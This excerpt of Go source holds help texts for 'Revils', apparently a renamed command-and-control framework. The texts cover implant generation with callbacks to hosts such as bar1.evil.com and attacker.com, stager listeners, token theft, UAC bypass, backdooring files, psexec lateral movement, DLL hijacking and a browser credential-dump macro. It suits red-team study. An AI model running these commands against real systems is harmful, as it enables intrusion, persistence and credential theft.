...
import (
	...
	consts "github.com/Kevin-kitnick/revils/client/constants"
)
...
[[.Bold]]About:[[.Normal]] List Revils sessions, and optionally interact or kill a session.`

	backgroundHelp = `[[.Bold]]Command:[[.Normal]] background
[[.Bold]]About:[[.Normal]] Background the active Revils.`

	infoHelp = `[[.Bold]]Command:[[.Normal]] info <revils name/session>
[[.Bold]]About:[[.Normal]] Get information about a Revils by name, or for the active Revils.`

	useHelp = `[[.Bold]]Command:[[.Normal]] use [revils name/session]
[[.Bold]]About:[[.Normal]] Switch the active Revils, a valid name must be provided (see sessions).`

	generateHelp = `[[.Bold]]Command:[[.Normal]] generate <options>
[[.Bold]]About:[[.Normal]] Generate a new revils binary and saves the output to the cwd or a path specified with --save.
...
The follow command is used to generate a revils Windows executable (PE) file, that will connect back to the server using mutual-TLS:
	generate --mtls foo.example.com 

The follow command is used to generate a revils Windows executable (PE) file, that will connect back to the server using Wireguard on UDP port 9090,
...
You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.Kevin-kitnick.com
...
Execution limits can be used to restrict the execution of a Revils implant to machines with specific configurations.

[[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Revils config
...
[[.Bold]]About:[[.Normal]] Generate a new revils stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --format.
...
[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Revils profile.
[[.Bold]]Examples:[[.Normal]] 

The following command will start a TCP listener on 1.2.3.4:8080, and link the [[.Bold]]my-revils-profile[[.Normal]] profile to it.
When a stager calls back to this URL, a revils corresponding to the said profile will be sent.

stage-listener --url tcp://1.2.3.4:8080 --profile my-revils-profile
...
[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Revils commands that run new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`
...
[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new Revils session as an elevated process (UAC bypass)`
...
Shellcode files should be binary encoded, you can generate Revils shellcode files with the generate command:
...
Websites can be thought of as a collection of content identified by a name, Revils can store any number of
...
[[.Bold]]Remarks:[[.Normal]]
Linux and MacOS shared library must call exit() once done with their jobs, as the Revils implant will wait until the hosting process
...
[[.Bold]]About:[[.Normal]] Load a Revils macro to add new commands.
...
Revils macros have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] macro):
chrome-dump
├── chrome-dump.dll
├── chrome-dump.so
└── manifest.json
It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
{
  ...
  "macroCommands":[
    {
      "name":"chrome-dump", // name of the command available in the revils client (no space)
...
[[.Bold]]About:[[.Normal]] Start a new revils as a service on a remote target.

This command uploads a Revils binary generated on the fly from a profile.
...
The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows user associated with the current Revils session.
`
	backdoorHelp = `[[.Bold]]Command:[[.Normal]] backdoor <remote file path>
[[.Bold]]About:[[.Normal]] Inject a revils shellcode into an existing file on the target system.
...
A file can be binary or text, Revils will attempt to detect the type of file automatically or you can specify 
...
using RevilsPy (Python) or revils-script (TypeScript/JavaScript).
...
we recommend using RevilsPy (Python) or revils-script (TypeScript/JavaScript).
...
The DLL used for the hijack can either be a file on the operator's system or built from a Revils profile,
...
# Use a Revils generated DLL for the hijack (you must specify -R or --run-at-load)
...
If no extension is specified, Revils will enumerate all installed extensions, extract their
...
External builders allow the Revils server offload implant builds onto external machines.
For more information: https://github.com/BishopFox/revils/wiki/External-Builders
`
)
